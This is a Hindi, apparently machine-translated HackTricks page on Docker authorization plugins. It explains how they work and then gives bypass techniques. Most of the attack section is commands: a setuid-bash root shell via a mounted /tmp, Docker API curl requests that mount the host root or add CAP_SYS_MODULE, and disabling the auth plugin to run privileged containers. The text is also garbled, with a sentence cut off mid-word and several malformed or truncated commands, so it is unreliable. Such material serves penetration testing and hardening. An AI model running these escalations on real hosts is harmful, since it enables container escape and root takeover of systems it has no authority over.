<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन HackTricks में देखना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** को** **फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>


**Docker** की आउट-ऑफ-द-बॉक्स **अधिकारीकरण** मॉडल **सब कुछ या कुछ नहीं** है। किसी भी उपयोगकर्ता को जो भी अनुमति है डॉकर डेमन तक पहुंचने की, वह किसी भी डॉकर क्लाइंट कमांड चला सकता है। यही बात कॉलर्स के लिए सही है जो इंजन API का उपयोग करके डेमन से संपर्क करते हैं। यदि आपको **अधिक पहुंच नियंत्रण** की आवश्यकता है, तो आप **अधिकारीकरण प्लगइन** बना सकते हैं और उन्हें अपने डॉकर डेमन कॉन्फ़िगरेशन में जोड़ सकते हैं। अधिकारीकरण प्लगइन का उपयोग करके, एक डॉकर प्रशासक डॉकर डेमन तक पहुंच को प्रबंधित करने के लिए विस्तार से पहुंच नीतियों को कॉन्फ़िगर कर सकता है।

# मूल वास्तुकला

डॉकर ऑथ प्लगइन बाहरी प्लगइन हैं जिन्हें आप डॉकर डेमन को अनुरोधित क्रियाओं को अनुमति देने/मना करने के लिए उपयोग कर सकते हैं जो उपयोगकर्ता ने अनुरोध किया है और जिस क्रिया को अनुरोध किया गया है पर निर्भर करता है।

**[निम्नलिखित जानकारी दस्तावेज़ से है](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

जब डॉकर डेमन के माध्यम से CLI या इंजन API के माध्यम से एक **HTTP अनुरोध** किया जाता है, तो **प्रमाणीकरण उपप्रणाली** अनुरोध को स्थापित **प्रमाणीकरण प्लगइन**(s) को पारित करती है। अनुरोध में उपयोगकर्ता (कॉलर) और कमांड संदर्भ होता है। **प्लगइन** को यह निर्णय लेने के लिए जिम्मेदार होता है कि क्या अनुरोध को **अनुमति देने या नकारने** की जाए।

नीचे दिए गए क्रमचय आलोकन चित्रों में अनुमति देने और नकारने की अधिकारीकरण फ्लो दिखाया गया है:

![अधिकारीकरण अनुमति देने का फ्लो](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![अधिकारीकरण नकारने का फ्लो](https://docs.docker.com/engine/extend/images/authz\_deny.png)

प्लगइन को भेजे गए प्रत्येक अनुरोध में **प्रमाणित उपयोगकर्ता, HTTP हेडर्स, और अनुरोध/प्रतिक्रिया शरीर** शामिल होते हैं। केवल **उपयोगकर्ता नाम** और **प्रमाणीकरण विधि** प्लगइन को पारित किए जाते हैं। सबसे महत्वपूर्ण बात यह है कि **कोई भी** उपयोगकर्ता **क्रेडेंशियल्स** या टोकन पारित नहीं किए जाते हैं। अंत में, **सभी अनुरोध/प्रतिक्रिया शरीर** केवल उन अनुरोध/प्रतिक्रिया शरीरों को भेजे जाते हैं जिनमें `Content-Type` या तो `text/*` है या `application/json` है।

जिन कमांडों में HTTP कनेक्शन को हाइजैक कर सकते हैं (`HTTP Upgrade`) जैसे कि `exec`, उनके लिए अधिकारीकरण प्लगइन को केवल प्रारंभिक HTTP अनुरोधों के लिए ही बुलाया जाता है। एक बार प्लगइन कमांड को मंजूर कर देता है, तो अधिकारीकरण को शेष फ्लो के लिए लागू नहीं किया जाता है। विशेष रूप से, स्ट्रीमिंग डेटा को अधिकारीकरण प्लगइन्स को पारित नहीं किया जाता है। `logs` और `events` जैसे चंक्ड HTTP प्रतिक्रिया वाले कमांडों के लिए केवल HTTP अनुरोध प्लगइन्स को भेजा जाता है।

अनुरोध/प्रतिक्रिया प्रसंस्करण के दौरान, कुछ अधिकारीकरण फ्लो को डॉकर डेमन के लिए अतिरिक्त क्वेरी करने की आवश्यकता हो सकती है। ऐसे फ्लो को पूरा करने के लिए, प्लगइन एक सामान्य उपयोगकर्ता की तरह डेमन API को कॉल कर सकते हैं। इन अतिरिक्त क्वेरियों को सक्षम करने के लिए, प्लगइन को एक प्रशासक को सही प्रमाणीकरण और सुरक्षा नीतियों को कॉन्फ़िगर करने के लिए साधन प्रदान करना चाहिए।

## कई प्लगइन

आपको अपने प्लगइन को डॉकर डेमन **स्टार्टअप** के हिस्से के रूप में **रजिस्टर** करने की जिम्मेदारी है। आप **कई प्लगइन स्थापित कर सकते हैं और उन्हें एक साथ जोड़ सकते हैं**। यह श्रृंखला क्रमबद्ध हो सकती है। प्रत्येक अनुरोध डेमन के माध्यम से श्रृंखला में क्रमबद्ध रूप से पारित होता है। केवल जब **सभी प्लगइन्स संसाधन के लिए अनुमति देते हैं**, तब ही पहुंच दी जाती है।

# प्लगइन उदाहरण

## Twistlock AuthZ Broker

प्लगइन [**authz**](https://github.com/twistlock/authz) आपको एक सरल **JSON** फ़ाइल बनाने की अनुमति देता है जिसे प्लगइन अनुरोधों की अधिकृति के लिए पढ़ने के लिए उपयोग करेगा। इसलिए, यह आपको बहुत आसानी से नियंत्रित करने का अवसर देता है कि प्रत्येक उपयोगकर्ता किस API एंडपॉइंट तक पहुंच सकता है।

यह एक उदाहरण है जो एलिस और बॉब को नए कंटेनर बना सकते हैं: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

पृष्ठ [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) में आप अनुरोधित URL और क्रिया के बीच संबंध पा सकते हैं। पृष्ठ [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) में आप क्रिया के नाम और क्रिया के बीच संबंध पा सकते हैं

## सरल प्लगइन ट्यूटोरियल

आप एक **सरल समझने योग्य प्लगइन** जिसमें स्थापना और डीबगिंग के बारे में विस्तृत ज
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### कंटेनर चलाना और फिर एक विशेषाधिकार सत्र प्राप्त करना

इस मामले में सिस्टम प्रशासक ने उपयोगकर्ताओं को वॉल्यूम माउंट और `--privileged` ध्वज के साथ कंटेनर चलाने या कंटेनर को कोई अतिरिक्त क्षमता न देने की अनुमति नहीं दी:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
हालांकि, एक उपयोगकर्ता **चल रहे कंटेनर के अंदर एक शैल बना सकता है और उसे अतिरिक्त विशेषाधिकार दे सकता है**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
अब, उपयोगकर्ता किसी भी [**पहले चर्चित तकनीकों**](./#privileged-flag) का उपयोग करके कंटेनर से बाहर निकल सकता है और मेज़बान में **विशेषाधिकारों को बढ़ा सकता है**।

## माउंट करने योग्य फ़ोल्डर

इस मामले में सिस्टम प्रशासक ने उपयोगकर्ताओं को कंटेनर को `--privileged` फ़्लैग के साथ चलाने से रोक दिया या कंटेनर को कोई अतिरिक्त क्षमता देने की अनुमति दी, और उसने केवल `/tmp` फ़ोल्डर को माउंट करने की अनुमति दी:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
ध्यान दें कि शायद आप `/tmp` फ़ोल्डर को माउंट नहीं कर सकते हैं लेकिन आप **एक अलग लिखने योग्य फ़ोल्डर** माउंट कर सकते हैं। आप लिखने योग्य निर्देशिकाएँ खोज सकते हैं इस्तेमाल करके: `find / -writable -type d 2>/dev/null`

**ध्यान दें कि एक लिनक्स मशीन में सभी निर्देशिकाएँ suid बिट का समर्थन नहीं करेंगी!** सुयोग्यता बिट का समर्थन करने वाली निर्देशिकाओं को जांचने के लिए `mount | grep -v "nosuid"` चलाएं। उदाहरण के लिए सामान्यत: `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` और `/var/lib/lxcfs` suid बिट का समर्थन नहीं करते हैं।

ध्यान दें कि यदि आप **`/etc` को माउंट** कर सकते हैं या किसी अन्य फ़ोल्डर को **कॉन्फ़िगरेशन फ़ाइलें शामिल** करते हैं, तो आप उन्हें डॉकर कंटेनर में रूट के रूप में बदल सकते हैं ताकि आप उन्हें **होस्ट में दुरुपयोग** करने और विशेषाधिकारों को उन्नत करने के लिए उपयोग कर सकें (शायद `/etc/shadow` को संशोधित करके)
{% endhint %}

## Unchecked API Endpoint

इस प्लगइन को कॉन्फ़िगर करने वाले सिसएडमिन की जिम्मेदारी यह होगी कि वह नियंत्रित करे कि प्रत्येक उपयोगकर्ता किस क्रिया को किस विशेषाधिकारों के साथ कर सकता है। इसलिए, यदि एडमिन एंडपॉइंट्स और गुणों के साथ **काले सूची** का उपयोग करता है तो वह शायद कुछ ऐसे भूल जाएंगे जो एक हमलावर को **विशेषाधिकारों को उन्नत करने** की अनुमति दें।

आप डॉकर API की जांच कर सकते हैं [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Unchecked JSON Structure

### रूट में बाइंड

संभावना है कि जब सिसएडमिन ने डॉकर फ़ायरवॉल कॉन्फ़िगर किया तो उसने [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) के "**Binds**" जैसे कुछ महत्वपूर्ण पैरामीटर के बारे में **भूल जाने** की संभावना है।\
निम्नलिखित उदाहरण में इस गलत कॉन्फ़िगरेशन का दुरुपयोग करना संभव है ताकि एक कंटेनर बनाया और चलाया जा सके जो होस्ट का रूट (/) फ़ोल्डर माउंट करता है:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
ध्यान दें कि इस उदाहरण में हम **`Binds`** पैरामीटर का उपयोग JSON में एक रूट स्तर कुंजी के रूप में कर रहे हैं लेकिन API में यह **`HostConfig`** कुंजी के तहत प्रकट होता है।
{% endhint %}

### HostConfig में Binds

**रूट में Binds** के साथ समान निर्देशिका का पालन करें और इस **अनुरोध** को Docker API को करें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### रूट में माउंट

**रूट में बाइंड्स** के साथ एक ही निर्देशिका का पालन करें और इस **अनुरोध** को Docker API में करें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### HostConfig में माउंट

डॉकर API को इस **अनुरोध** को करते समय **रूट में बाइंड** के साथ एक ही निर्देश का पालन करें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## जाँच न किया गया JSON विशेषता

संभावना है कि जब सिस्टम प्रशासक ने डॉकर फ़ायरवॉल कॉन्फ़िगर किया तो उन्होंने [API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) के "**HostConfig**" के अंदर "**Capabilities**" जैसी किसी महत्वपूर्ण विशेषता को **भूल गए** हों। निम्नलिखित उदाहरण में इस गलत कॉन्फ़िगरेशन का दुरुपयोग करके **SYS\_MODULE** क्षमता के साथ एक कंटेनर बनाना और चलाना संभव है:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** वह कुंजी है जिसमें आम तौर पर उन **रोचक** **विशेषाधिकार** होते हैं जिनसे कंटेनर से बाहर निकला जा सकता है। हालांकि, जैसा कि हम पहले ही चर्चा कर चुके हैं, ध्यान दें कि इसके बाहर Binds का उपयोग भी काम करता है और आपको प्रतिबंधों को छलकरने की अनुमति देता है।
{% endhint %}

## प्लगइन को निषेधित करना

यदि **सिस्टम प्रशासक** ने **भूलकर** **प्रतिबंध** लगाने की क्षमता को **निषेधित** करने की क्षमता को **भूल गए** है, तो आप इसका पूरी तरह से निषेधित करने का लाभ उठा सकते हैं!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
ध्यान दें कि **उच्चतम स्तर पर चढ़ाई के बाद प्लगइन को पुनः सक्रिय करें**, अन्यथा **डॉकर सेवा को पुनः आरंभ करने से काम नहीं चलेगा**!

## ऑथ प्लगइन बायपास व्रिटअप्स

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## संदर्भ

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** ट्विटर पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>
